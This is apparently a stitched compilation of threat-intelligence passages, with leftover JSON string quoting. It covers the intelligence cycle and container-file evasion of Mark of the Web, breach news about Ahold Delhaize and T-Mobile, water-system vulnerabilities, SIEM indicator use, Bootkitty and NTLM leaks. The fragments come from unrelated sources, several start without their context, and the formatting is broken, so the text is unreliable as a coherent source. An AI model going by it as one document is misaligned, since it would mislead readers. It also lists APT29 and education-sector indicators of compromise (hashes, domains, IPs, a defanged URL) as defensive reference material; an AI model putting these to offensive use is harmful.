            "How do we apply the CTI Intel Cycle in practical terms? Like many other analyst teams, we start our Planning by defining our Key Intel Questions (What are the key threats that we are confronting or that have the potential to impact SLTTs?) and Priority Intelligence Requirements. (Where can we find that information, and how can we enrich it to serve SLTTs?) These considerations serve as first principles, guiding our collections, analysis, and reporting to SLTT entities. For these reasons, it’s critical that they’re finely tuned and informed by SLTT feedback and input across our team.\n",
            "Case Study: Mark of the Web (MOTW) – The Intel Cycle in Action\n",
            "Once we’ve established our collections and intel requirements, it’s time to start collecting. To demonstrate this, we’ll refer to an example where our analysis eventually led to a blog post describing how threat actors were leveraging container files to evade Mark of the Web (MOTW). In the next step of the intel process, we ensure our Collections source from tailored resources, providing actionable information concerning threats most likely to impact SLTTs.\n",
            "The MOTW blog started when one of our analysts reviewed MS-ISAC internal data as part of our Processing step and identified a 173% annual spike in cyber threat actors (CTAs) leveraging container files to push malware. This sudden spike led the analyst to review the context behind the data to make sense of what was going on and determine if it signified an emerging threat tactic, technique, or procedure (TTP) likely to impact SLTTs. The analyst then dug into the context behind the data and enriched it with context from other sources.\n",
            " Analysis into the trend revealed that the tactic was an adaptation on the CTAs’ part to a recent security change by Microsoft to block macros in MS Office documents by default. The CTAs determined that leveraging container files would provide a workaround, enabling them to circumvent Microsoft’s change and continue to deliver files with embedded malicious executables.\n",
            "After reviewing further evidence and collaborating across MS-ISAC teams, the analyst refined their assessments to a degree that they were ready to produce a report on their findings. Analytic production is a critical step because the analyst consolidates their findings into a report to communicate the team’s tailored assessments and messaging to SLTTs. The actual product Dissemination takes several forms, including briefings to the SLTT community, direct peer-to-peer communication with SLTT representatives, finished intelligence reports, and other mechanisms as needed.\n",
            "Why We Do What We Do with CTI\n",
            "Ultimately, this fluid process is designed to assess threats and communicate to busy SLTT decision-makers precisely what they need to know to defend against or remediate the threat. The key components that comprise our messaging are the:\n",
            " What? What happened? What is the threat?\n",
            " So What? Why is this important to them?\n",
            " Now What? What do they need to do about it?\n",
            "Effectively communicating these points relies on our team maintaining communication with SLTTs and ensuring that our work across all five stages of the intelligence cycle is tailored to meet their needs. In this way, we help them align themselves so that they're in the best position possible to defend their networks against emerging threats.\n",

Parent company Ahold Delhaize issued the statement, which said they recently detected a “cybersecurity issue” within their US systems. The company notified law enforcement and began an investigation led by cybersecurity experts, the statement said. “We will continue to take actions to further protect our systems,” the statement said. “The security of our customers, associates and partners is a top priority.”  The statement said that all of Ahold Delhaize’s stores in the US remain open, despite the breach. It is unclear when the networks will be back up and running.  What is affected in the attack?  The statement was vague when defining what processes were threatened during the attack. However, the statement said the breach, and efforts to mitigate it, have affected some pharmacies and e-commerce online. It also seems that product deliveries may arrive later than expected at Stop &amp; Shop locations. A sign inside a Revere Stop &amp; Shop told customers an IT outage was affecting “behind the scenes operations,” WCVB reported.  Hannaford Supermarkets, which is also owned by Ahold Delhaize, experienced technical issues as well, saying some of their stores and pharmacies were experiencing “network issues.” The statement from Hannaford urged people who need their prescriptions to visit their local pharmacy, as the supermarket’s website was down.\n",

            "Text: Why We Did This Report  As part of the U.S. Environmental Protection Agency Office of Inspector General’s continued oversight of the EPA’s role as a sector risk management agency, passive assessment of cybersecurity vulnerabilities was conducted on drinking water systems with populations served of 50,000 people or greater. The results identified cybersecurity vulnerabilities that an attacker could exploit to degrade functionality, cause loss or denial of service, or facilitate the theft of customer or proprietary information.  Summary of Findings  The passive assessment covered 1,062 drinking water systems for cybersecurity vulnerabilities that serve over 193 million people across the United States. Scan results for October 8, 2024, identified 97 drinking water systems serving approximately 26.6 million users as having either critical or high-risk cybersecurity vulnerabilities. Although not rising to a level of critical or high-risk cybersecurity vulnerabilities, an additional 211 drinking water systems, servicing over 82.7 million people, were identified as medium and low by having externally visible open portals. If malicious actors exploited the cybersecurity vulnerabilities identified in this passive assessment, they could disrupt service or cause irreparable physical damage to drinking water infrastructure. While attempting to notify the EPA about the cybersecurity vulnerabilities, the OIG found that the EPA does not have its own cybersecurity incident reporting system that water and wastewater systems could use to notify the EPA of cybersecurity incidents.\n",

            "Threat intelligence is information about the potential attacks an organization may face and how to detect and stop those attacks. Law enforcement sometimes distributes \"Wanted\" posters with information about suspects; similarly, cyber threat intelligence contains information about what current threats look like and where they come from.\n",
            "In digital security terms, a \"threat\" is an action with malicious intent that could result in data being stolen, lost, or altered without permission. The term refers to both potential and actual attacks. Threat intelligence enables organizations to take action against threats, rather than merely providing data. Each piece of threat intelligence helps make it possible to detect and prevent attacks.\n",
            "Some types of threat intelligence can be fed into firewalls, web application firewalls (WAFs), security information and event management (SIEM) systems, and other security products, enabling them to more effectively identify and block threats. Other types of threat intelligence are more general and help organizations make larger strategic decisions.\n",
            "What are the three main types of threat intelligence?\n",
            "Most threat intelligence fits into one of these three categories:\n",
            " Strategic intelligence describes overall trends and long-term issues. It can also include the motivations, goals, and methods of known attackers.\n",
            " Operational intelligence describes the tactics, techniques, and procedures (TTP) used by attackers — for instance, which malware toolkits or exploit kits attackers use, where their attacks come from, or the steps they typically follow to carry out an attack.\n",
            " Tactical intelligence is specific on-the-ground details about threats; it enables organizations to identify threats on a case-by-case basis. Malware signatures and indicators of compromise (IoC) are examples of tactical intelligence. Both of these terms are explained further below.\n",
            "What is a malware signature?\n",
            "A signature is a unique pattern or sequence of bytes by which malware can be identified. In the same way that fingerprints are used to identify persons suspected of a crime, signatures help identify malicious software.\n",
            "Signature detection is one of the most common forms of malware analysis. To be effective, signature detection needs to be constantly updated with the latest malware signatures identified in the wild.\n",
            "What are indicators of compromise (IoC)?\n",
            "An indicator of compromise (IoC) is a piece of data that helps identify whether or not an attack has taken place or is in progress. An IoC is like an item of physical evidence that a detective might collect to determine who was present at the scene of the crime. Similarly, certain digital evidence — unusual activity recorded in logs, network traffic to unauthorized servers, etc. — helps administrators determine when an attack has occurred (or is currently happening) and what kind of attack it was.\n",
            "Without IoCs, it can sometimes be difficult to determine if an attack has taken place; it often benefits the attacker to remain undetected (for instance, if they want to use a compromised device in a botnet).\n",
            "What is a threat intelligence feed?\n",
            "A threat intelligence feed is an external stream of threat intelligence data. Like an RSS feed for blogs, organizations can subscribe to a threat intelligence feed to provide constant security updates to their systems.\n",
            "Some threat intelligence feeds are free; others cost money and provide proprietary intelligence not available from open sources.\n",
            "What is unique about the approach Cloudflare takes to collecting threat intelligence?\n",
            "Cloudflare is uniquely positioned to collect information about threats on a huge scale. Millions of websites are protected by the Cloudflare network. By analyzing traffic to and from these websites, Cloudflare can identify malicious traffic patterns from bots, vulnerability exploits, and other attacks.\n",
            "Cloudflare uses this information to better protect customers. For example, Cloudflare creates WAF rules and deploys them for all WAF customers whenever a new threat is detected. Cloudflare Bot Management uses threat intelligence from the billions of requests Cloudflare sees each day to learn to identify malicious bots.\n",

            "   Introduction to threat intelligence \n",
            "Cyber threat intelligence (CTI) is information describing existing or potential threats to systems and users. This intelligence takes many forms, from written reports detailing a particular threat actor's motivations, infrastructure, and techniques, to specific observations of IP addresses, domains, file hashes, and other artifacts associated with known cyber threats. CTI is used by organizations to provide essential context to unusual activity, so security personnel can quickly take action to protect their people, information, and assets. CTI can be sourced from many places, such as open-source data feeds, threat intelligence-sharing communities, commercial intelligence feeds, and local intelligence gathered in the course of security investigations within an organization.\n",
            "For SIEM solutions like Microsoft Sentinel, the most common forms of CTI are threat indicators, also known as Indicators of Compromise (IoC) or Indicators of Attack (IoA). Threat indicators are data that associate observed artifacts such as URLs, file hashes, or IP addresses with known threat activity such as phishing, botnets, or malware. This form of threat intelligence is often called tactical threat intelligence because it's applied to security products and automation in large scale to detect potential threats to an organization and protect against them. Use threat indicators in Microsoft Sentinel, to detect malicious activity observed in your environment and provide context to security investigators to inform response decisions.\n",
            "Integrate threat intelligence (TI) into Microsoft Sentinel through the following activities:\n",
            "  Import threat intelligence into Microsoft Sentinel by enabling data connectors to various TI platforms and feeds.\n",

            "   Import threat intelligence with data connectors \n",
            "Just like all the other event data in Microsoft Sentinel, threat indicators are imported using data connectors. Here are the data connectors in Microsoft Sentinel provided specifically for threat indicators.\n",

            "Tagging threat indicators is an easy way to group them together to make them easier to find. Typically, you might apply tags to an indicator related to a particular incident, or representing threats from a particular known actor or well-known attack campaign. Once you search for the indicators you want to work with, tag them individually, or multi-select indicators and tag them all at once with one or more tags. Since tagging is free-form, a recommended practice is to create standard naming conventions for threat indicator tags.\n",
            "Validate your indicators and view your successfully imported threat indicators from the Microsoft Sentinel enabled log analytics workspace.

            "   Detect threats with threat indicator analytics \n",
            "The most important use case for threat indicators in SIEM solutions like Microsoft Sentinel is to power analytics rules for threat detection. These indicator-based rules compare raw events from your data sources against your threat indicators to detect security threats in your organization. In Microsoft Sentinel Analytics, you create analytics rules that run on a schedule and generate security alerts. The rules are driven by queries, along with configurations that determine how often the rule should run, what kind of query results should generate security alerts and incidents, and optionally trigger an automated response.\n",
            "While you can always create new analytics rules from scratch, Microsoft Sentinel provides a set of built-in rule templates, created by Microsoft security engineers, to leverage your threat indicators. These built-in rule templates are based on the type of threat indicators (domain, email, file hash, IP address, or URL) and data source events you want to match. Each template lists the required sources needed for the rule to function. This makes it easy to determine if the necessary events are already imported in Microsoft Sentinel.\n",
            "By default, when these built-in rules are triggered, an alert will be created. In Microsoft Sentinel, the alerts generated from analytics rules also generate security incidents which can be found in Incidents under Threat Management on the Microsoft Sentinel menu. Incidents are what your security operations teams will triage and investigate to determine the appropriate response actions. Find detailed information in this Tutorial: Investigate incidents with Microsoft Sentinel.\n",

            "Text: Tactical threat intelligence     Tactical threat intelligence is the most basic form of threat intelligence. These are your common indicators of compromise (IOCs). Tactical intelligence is often used for machine-to-machine detection of threats and for incident responders to search for specific artifacts in enterprise networks.    Using tactical threat intelligence    Tactical threat intelligence and IOCs are meant to historically document cyber attacks, serving both as a corpus of evidence (for compliance, law enforcement, investigations, legal purposes, etc.) and also as reference material for analysts to interpret and extract context for use in defensive operations. IOCs are provided to analysts to serve as examples of a particular threat, such as a malware sample, malware family, intrusion campaign, or threat actor. Analysts can enrich alerts from security solutions with tactical threat intelligence to provide more context and determine which threats are worth worrying about and which can safely be ignored.        Tactical threat intelligence for APT29        628d4f33bd604203d25dbc6a5bb35b90     2aabd78ef11926d7b562fd0d91e68ad3     3d3363598f87c78826c859077606e514     meek-reflect.appspot.com     portal.sbn.co.th     202.28.231.44      hxxps://files.counseling[.]org/eFax/incoming/150721/5442.zip      googleService.exe      GoogleUpdate.exe      acrotray.exe      PCI\\VEN_80EE&amp;DEV_CAF        Tactical threat intelligence for education sector        d9b7b0eda8bd28e8934c5929834e5006     support@securitygrade[.]org     46.244.4.37            Operational threat intelligence     Operational threat intelligence provides insight into actor methodologies and exposes potential risks. It fuels more meaningful detection, incident response, and hunting programs. Where tactical threat intelligence gives analysts context on threats that are already known, operational intelligence brings investigations closer to uncovering completely new threats. This kind of intelligence is most frequently used by forensic investigators and incident responders, and typically includes the following types of items:        Tools for particular threat groups (utilities, backdoor families, common infrastructure)     Tactics, Techniques, and Procedures (TTPs) for particular threat groups (staging directories, file naming conventions, ports, protocols, favorite file types)     Emerging TTPs (new persistence methods, exploits, phishing schemes)   Consider the following from an incident response perspective: If you are responding to an intrusion event, you may wonder how a particular actor performs privilege escalation, lateral movement, or data theft. If you are hunting for undiscovered malicious activity, you might want to start your hunt by looking for a specific actor's behavior. Whatever your scenario, you need to answer the question “How do you search for this actor within your environment?”      Using operational threat intelligence    Operational threat intelligence is knowledge gained from examining details from known attacks. An analyst can build a solid picture of actor methodology by piecing together tactical indicators and artifacts and derive them into operational intelligence. This can help to achieve a number of defensive goals, like enhancing incident response plans and mitigation techniques for future attacks and incidents. Analysts can also implement and bolster a proactive discovery program (“hunting program”) to identify suspicious files and activity that have bypassed traditional security technologies. From there they can develop detection methodologies that are not dependent on IOCs, ensuring broader coverage of threats in a more timely fashion.      Examples of operational threat intelligence       Example operational threat intelligence for APT29       Preferred Infection Vector: spear phishing with self-extracting RAR        First Stage Malware Families: COZYCAR, SWIFTKICK, TADPOLE        Second Stage Malware Families: SEADADDY, MINIDIONIS, SPIKERUSH        Persistence Techniques     Scheduled Tasks for most backdoors    WMI by manual installation for backdoors that do not have persistence built-in    Legitimate file replacement of Windows Error Reporting file (wermgr.exe)               Use of Google Docs for C2        Use of Google Cloud Apps for C2 forwarding (as a proxy)        Use of HTTP POST requests over 443 for C2        Use of backdoors configured for ports 1, 80, 443, 3389 for C2        Use of PowerShell scripts        Use of Py2Exe to modify and recompile backdoors with variance in C2 protocols and C2 infrastructure        Example operational threat intelligence for the education sector       Common attack vectors are spear phishing, watering holes, and SQL injection        Spear phishing university professors who specialize in incorporating new technology into classrooms        Spear phishing to recruiters and people involved in hiring processes        Common attacks are spear-phishing and SQL injection (SQLi)        Common malware families: PISCES, SOGU, LOGJAM, COBALT, COATHOOK, POISONIVY, NJRAT, NETWIRE        Common pentesting families: Meterpreter, PowerShell Empire, Metasploit Framework            Use of HTTPS and custom TCP protocols for C2        Use of .ru, .su TLDs for C2 domains        Use of yandex.ru and bk.ru for email addresses        Theft of databases containing student names, administrative credentials, billing information, social security numbers, and other PII.             Strategic threat intelligence      Strategic threat intelligence provides a big picture look at how threats and attacks are changing over time. Strategic threat intelligence may be able to identify historical trends, motivations, or attributions as to who is behind an attack. Knowing the who and why of your adversaries also provides clues to their future operations and tactics. This makes strategic intelligence a solid starting point for deciding which defensive measures will be most effective. Strategic threat intelligence might include information on the following topic areas:      Attribution for intrusions and data breaches     Actor group trends     Targeting trends for industry sectors and geographies     Mapping cyber attacks to geopolitical conflicts and events(South China Sea, Arab Spring, Russia-Ukraine)     Global statistics on breaches, malware, and information theft     Major attacker TTP changes over time        Using strategic threat intelligence    Strategic threat intelligence is built upon a huge body of knowledge and includes expert opinions and insights that are based on aggregating both operational and tactical threat intelligence from known cyber attacks. This intelligence is particularly useful for people in leadership roles such as CISOs and executive leadership who must justify budgets and make better-informed investment decisions. Some uses of strategic threat intelligence include:     Inform your executive leadership about high-risk threat actors, relevant risk scenarios, and threat exposure in the public-facing technology sphere and criminal underground.     Perform thorough risk analysis and review of the entire technology supply chain.     Learn which commercial ventures, vendors, partner companies, and technology products are most likely to increase or decrease risk to your enterprise environment.        Examples of strategic threat intelligence       Strategic threat intelligence for APT29       APT29 is a Russia-based actor that typically engages in cyber espionage with the purpose of data theft.        APT29 victims include many global organizations in government, education, high-technology, finance, non-profit, pharma, and the Defense Industrial Base.        APT29 is an adaptable, sophisticated group with the ability to develop custom attack tools, convoluted command-and-control infrastructure, and unlike historical behaviors of Russian state-sponsored actors, this group has the audacity to continue to operate long after they have been detected.        APT29 has been historically tasked to pursue operations surrounding foreign government policy issues, especially those involving the Russia-Ukraine conflict. Furthermore, the group has targeted several Western national government agencies, defense and government contractors, and academic institutions.        Strategic threat intelligence for the education sector       Educational IT infrastructure has a diverse user base and is thus typically comprised of a myriad of operating systems, computer types, software, and tons of servers and websites that are publicly accessible from the internet. This makes universities and academic research facilities prime targets for attackers as both places from which to steal valuable data and also as hop points for further intrusion operations.        The education industry will continue to see cyber-espionage activity in the foreseeable future. We expect threat actors from China, Russia, Iran, and other countries to conduct espionage operations for data theft, trade information, economic intelligence, and monitoring of diaspora.        Several groups have been observed conducting intrusion operations that have affected academic institutions including universities and research centers:     APT10 aka “MenuPass Group”    APT22 aka “Barista Team”    APT29 aka “The Dukes”\n",

The good news? They spotted it early and no customer data was stolen. While T-Mobile isn't pointing fingers directly, cybersecurity experts think they know who's behind it - a hacking group nicknamed 'Salt Typhoon,' which apparently has ties to China. What makes this really interesting is that these hackers have a brand new trick up their sleeve: they're using a previously unknown backdoor tool called GHOSTSPIDER. Think of it as a skeleton key that no one knew existed until now. They've been using this same tool to target telecom companies across Southeast Asia.\n",

In doing so, the idea is to execute malicious code before even initializing the operating system and bypass security measures, effectively granting the attackers absolute control over the system. While bootkits discovered to date have only targeted Windows machines, the discovery of Bootkitty indicates that it's no longer the case. That said, it's assessed to be a proof-of-concept (PoC) and there is no evidence that it has been put to use in real-world attacks.\n",

Cybersecurity firm Morphisec said it identified five significant NTLM vulnerabilities that could be exploited to leak the credentials via Malicious RTF Document Auto Link in Microsoft Word, Remote Image Tag in Microsoft Outlook, Remote Table Refresh in Microsoft Access, Legacy Player Files in Microsoft Media Player, and Remote Recipient List in Microsoft Publisher. Microsoft has acknowledged these flaws but noted that they are either by design or do not meet the bar for immediate servicing. It's recommended to restrict NTLM usage, enable SMB signing and encryption, block outbound SMB connections to untrusted networks, and switch to Kerberos-only authentication.\n",

            "In 2023, malicious cyber actors exploited more zero-day vulnerabilities to compromise enterprise networks compared to 2022, allowing them to conduct cyber operations against higher-priority targets. In 2023, the majority of the most frequently exploited vulnerabilities were initially exploited as a zero-day, which is an increase from 2022, when less than half of the top exploited vulnerabilities were exploited as a zero-day.\n",
            "Malicious cyber actors continue to have the most success exploiting vulnerabilities within two years after public disclosure of the vulnerability. The utility of these vulnerabilities declines over time as more systems are patched or replaced. Malicious cyber actors find less utility from zero-day exploits when international cybersecurity efforts reduce the lifespan of zero-day vulnerabilities. \n",
